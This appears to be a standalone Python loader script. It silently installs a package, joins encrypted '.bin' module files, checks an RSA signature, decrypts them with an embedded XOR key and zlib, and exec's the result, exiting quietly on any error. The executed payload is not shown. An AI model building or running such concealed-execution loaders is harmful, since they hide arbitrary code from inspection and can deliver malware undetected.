#!/usr/bin/env python3
import sys
import base64
import zlib
import marshal
import subprocess
from pathlib import Path
from typing import cast

def ensure(pkg: str) -> None:
    try:
        __import__(pkg)
    except Exception:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            sys.exit(1)

ensure("cryptography")

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey
from cryptography.hazmat.primitives import hashes, serialization

PUB_KEY: bytes = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnrLwVje9Fyx+PiMXdb07\nn3EzdioM65d2W12+5hm5zzuxNNi2pofIaXOLmjuozIBs0jsoSWPWgX2avUFK0w4u\ng+lSBe91wcJzK8sVcyWCiqcwnLl8OlKnOaESsx+fCWa23cApFyEudmGCIRLQT8lr\nJ2DPTIgoDv8YwBbSfpGy9ATOwTTxAk7VWM4yi2rumZ8c5WV0xM8DaDdLmbx/JRIN\naM4KiZF7ZyH59+k+VXEKdDW2+kQ792ifzOUg1mleUcRHJIKOSTGVqDk6kLV415o2\niWNP1grTuC9TeXc3IC15ujwsaP47xdDn3yinK27qS/kYjk+zF0G+etqcFKSSI+iz\nkwIDAQAB\n-----END PUBLIC KEY-----\n'
SYM_KEY: bytes = base64.b64decode("ruVQ6iT65E9jyoCtnGBQEcF65ADjuSQnKggxZo9thZ8=")

def xor(data: bytes) -> bytes:
    k = len(SYM_KEY)
    return bytes(b ^ SYM_KEY[i % k] for i, b in enumerate(data))

try:
    base = Path(getattr(sys, "_MEIPASS", Path(__file__).parent))
    mods = base / "modules"
    files = sorted(mods.glob("p*.bin"))
    if not files:
        sys.exit(1)

    blob = b"".join(p.read_bytes() for p in files)
    if b"." not in blob:
        sys.exit(1)

    sig_b64, enc = blob.split(b".", 1)

    pub = cast(RSAPublicKey, serialization.load_pem_public_key(PUB_KEY))
    pub.verify(
        base64.b64decode(sig_b64),
        enc,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )

    data = zlib.decompress(xor(base64.b64decode(enc)))

    try:
        code = marshal.loads(data)
    except Exception:
        text = data.decode("utf-8")
        if "\x00" in text:
            sys.exit(1)
        code = compile(text, "<run>", "exec")

    exec(code, {"__name__": "__main__"})

except Exception:
    sys.exit(1)
